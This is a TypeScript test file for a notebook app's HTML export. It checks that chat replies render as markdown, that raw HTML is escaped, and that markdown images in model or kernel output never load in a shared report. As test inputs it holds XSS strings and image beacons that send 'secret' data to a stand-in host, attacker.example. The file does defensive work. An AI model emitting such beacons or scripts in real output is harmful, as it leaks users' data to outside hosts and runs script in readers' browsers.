/**
 * A chat cell's reply exported to HTML reads as PROSE, not as escaped markup.
 *
 * The reply is persisted as a `display_data` carrying `text/markdown` (plus an
 * identical `text/plain` twin so a consumer with no markdown renderer still
 * shows it). Falling straight through to that twin exported the whole content of
 * a chat cell as literal `**bold**`, `##` headings and `- ` bullets inside a
 * `<pre>` - markup where the app shows a rendered answer.
 *
 * The exported HTML is this module's own generated artifact (a single-file,
 * offline-safe document), so asserting on its bytes is asserting on the contract
 * the module exists to produce.
 */
import { describe, it, expect } from 'vitest';
import { renderNotebookHtml } from '../../src/lib/server/export-html';
import type { CellView, CellOutput } from '../../src/lib/server/types';

const REPLY = '## Findings\n\n**x** is 1, because:\n\n- the cell above assigns it\n- nothing rebinds it\n';

function chatCell(reply: string): CellView {
	const out: CellOutput = {
		output_type: 'display_data',
		data: { 'text/markdown': reply, 'text/plain': reply },
		metadata: {}
	};
	return {
		id: 'chat1',
		cell_type: 'code',
		source: 'Why is x one?',
		outputs: [out],
		metadata: { cellar: { language: 'chat' } }
	};
}

/** The rendered document body for one cell, both view modes. */
const render = (cell: CellView, hideAllCode = false) => renderNotebookHtml({ cells: [cell], hideAllCode });

describe('a text/markdown output exports as rendered prose', () => {
	it('renders headings, emphasis and lists as real elements, not escaped source', () => {
		const html = render(chatCell(REPLY));
		expect(html).toContain('<h2>Findings</h2>');
		expect(html).toContain('<strong>x</strong>');
		expect(html).toContain('<li>the cell above assigns it</li>');
		// And NOT as the text/plain twin inside a <pre>.
		expect(html).not.toContain('## Findings');
		expect(html).not.toContain('**x**');
	});

	it('survives report view, where the reply is all the cell contributes', () => {
		const html = render(chatCell(REPLY), true);
		expect(html).not.toContain('class="cell-input"');
		expect(html).not.toContain('Why is x one?');
		expect(html).toContain('<h2>Findings</h2>');
	});

	it('is not math-aware: `$…$` stays literal text (this module ships no KaTeX)', () => {
		const html = render(chatCell('Revenue was $5 vs $1,200 last year.'));
		expect(html).toContain('$5 vs $1,200');
		expect(html).not.toContain('katex');
	});

	it('renders no raw HTML from the model (html:false escapes it to text)', () => {
		const html = render(chatCell('Careful: <img src=x onerror=alert(1)> and <script>alert(2)</script>'));
		expect(html).not.toContain('<img src=x');
		expect(html).not.toContain('<script>alert(2)');
		expect(html).toContain('&lt;script&gt;');
	});
});

/**
 * The SAME no-fetch rule the app applies, pinned here against the SAME cases -
 * the export has no DOM and so cannot share the app's sanitizer, and this is the
 * worse of the two leaks: the beacon fires in every READER's browser when they
 * open the shared report, not just the author's.
 *
 * `html:false` escapes RAW html but does NOT touch markdown-it's own image rule,
 * so `![](url)` was still emitted as a live `<img src>` here.
 */
describe('a machine-emitted text/markdown output never fetches in the exported report', () => {
	const fetchingElements = (html: string): string[] =>
		Array.from(html.matchAll(/<(img|picture|source|video|audio|track|embed|object|iframe|input)\b/gi)).map((m) =>
			m[1].toLowerCase()
		);

	it('an image in a reply becomes its alt text, and its URL never reaches the document', () => {
		const html = render(chatCell('Here: ![the summary chart](https://attacker.example/?d=secret)'));
		expect(fetchingElements(html)).toEqual([]);
		expect(html).not.toContain('attacker.example');
		expect(html).toContain('the summary chart');
	});

	it('an image with no alt shows its URL as plain text, never as a loading element', () => {
		const html = render(chatCell('![](https://attacker.example/pixel.gif?d=secret)'));
		expect(fetchingElements(html)).toEqual([]);
		expect(html).toContain('https://attacker.example/pixel.gif?d=secret');
		expect(html).not.toMatch(/<img[^>]*attacker\.example/i);
	});

	it('every markdown image form is neutralised, not just the inline one', () => {
		for (const reply of [
			'![alt][ref]\n\n[ref]: https://attacker.example/x.png',
			'![alt](data:image/png;base64,iVBORw0KGgo=)'
		]) {
			const html = render(chatCell(reply));
			expect(fetchingElements(html)).toEqual([]);
			expect(html).not.toContain('attacker.example');
			expect(html).not.toContain('data:image/png;base64');
		}
	});

	it('holds after the cell is RETYPED away from chat - the rule is about the OUTPUT', () => {
		// A chat cell converted to code keeps its outputs, so a rule keyed on the
		// cell's current type would re-open the channel here.
		const retyped = chatCell('![a chart](https://attacker.example/after-retype.png)');
		retyped.metadata = { cellar: {} };
		const html = render(retyped);
		expect(fetchingElements(html)).toEqual([]);
		expect(html).not.toContain('attacker.example');
		expect(html).toContain('a chart');
	});

	it('holds for a markdown table found in kernel OUTPUT text', () => {
		const cell: CellView = {
			id: 'c',
			cell_type: 'code',
			source: 'print(report)',
			outputs: [
				{ output_type: 'stream', name: 'stdout', text: '| a | b |\n|---|---|\n| ![a plot](https://attacker.example/t.png) | 2 |\n' }
			],
			metadata: {}
		};
		const html = render(cell);
		expect(fetchingElements(html)).toEqual([]);
		expect(html).not.toContain('attacker.example');
	});

	it('links stay clickable, and an authored markdown CELL keeps its images', () => {
		const withLink = render(chatCell('[the docs](https://example.com/docs)'));
		expect(withLink).toContain('href="https://example.com/docs"');

		const mdCell: CellView = {
			id: 'm',
			cell_type: 'markdown',
			source: 'text ![chart](https://example.com/chart.png) more',
			outputs: [],
			metadata: {}
		};
		const html = renderNotebookHtml({ cells: [mdCell], hideAllCode: false });
		expect(html).toContain('<img src="https://example.com/chart.png"');
	});
});

describe('every other output priority is unchanged', () => {
	it('an image still beats a markdown payload', () => {
		const cell: CellView = {
			id: 'c',
			cell_type: 'code',
			source: 'plot()',
			outputs: [
				{ output_type: 'display_data', data: { 'image/png': 'AAAABBBB', 'text/markdown': '**not this**' }, metadata: {} }
			],
			metadata: {}
		};
		const html = render(cell);
		expect(html).toContain('data:image/png;base64,AAAABBBB');
		expect(html).not.toContain('<strong>not this</strong>');
	});

	it('a plain-only result still renders as preformatted text', () => {
		const cell: CellView = {
			id: 'c',
			cell_type: 'code',
			source: 'df.head()',
			outputs: [{ output_type: 'display_data', data: { 'text/plain': '   a  b\n0  1  2' }, metadata: {} }],
			metadata: {}
		};
		const html = render(cell);
		expect(html).toContain('output-text tone-result');
		expect(html).toContain('0  1  2');
	});
});

describe('the tool-activity lines reach the export', () => {
	// The lines are markdown in the reply itself (see `chat/run-chat.ts`), so the
	// export needs no code of its own - which is exactly why it needs a test: a
	// shared report is where provenance matters MOST, and nothing else here would
	// notice if the export stopped rendering them as the app does.
	const REPLY_WITH_TOOLS =
		'Let me check.\n\n' +
		'> `Read(src/lib/loader.py)`\\\n' +
		'> `Read(src/lib/missing.py)` *(failed)*\\\n' +
		'> `Glob(**/*.csv)`\n\n' +
		'It defines `load`.';

	it('renders them as ONE subordinate block, one call per line', () => {
		const html = render(chatCell(REPLY_WITH_TOOLS));
		expect(html.match(/<blockquote>/g)).toHaveLength(1);
		expect(html).toContain('<code>Read(src/lib/loader.py)</code>');
		// The hard break survives this engine too (it is `breaks: false`, like the
		// app's), so three calls read as three lines rather than running together.
		const quote = html.slice(html.indexOf('<blockquote>'), html.indexOf('</blockquote>'));
		expect(quote.match(/<br>/g)).toHaveLength(2);
	});

	it('keeps a failed call distinguishable, and the glob literal', () => {
		const html = render(chatCell(REPLY_WITH_TOOLS));
		expect(html).toContain('<em>(failed)</em>');
		expect(html).toContain('<code>Glob(**/*.csv)</code>');
		expect(html).not.toContain('<em>Glob'); // the asterisks never opened emphasis
	});

	it('styles the block as secondary text, and does not swallow the reply', () => {
		const html = render(chatCell(REPLY_WITH_TOOLS));
		// The export's own stylesheet already dims a blockquote (muted ink, left
		// rule), which is what makes these annotations subordinate with no new CSS.
		expect(html).toContain('.cellar-md blockquote{');
		expect(html).toContain('color: var(--muted)');
		// The prose either side of the block is outside it.
		expect(html).toContain('<p>Let me check.</p>');
		expect(html).toContain('<p>It defines <code>load</code>.</p>');
	});

	it('shows them in REPORT view too, where the code is hidden', () => {
		// Report view drops the input; the reply - annotations included - is the
		// whole artifact, so the provenance must survive it.
		const html = render(chatCell(REPLY_WITH_TOOLS), true);
		expect(html).toContain('<code>Read(src/lib/loader.py)</code>');
		expect(html).toContain('<em>(failed)</em>');
	});
});
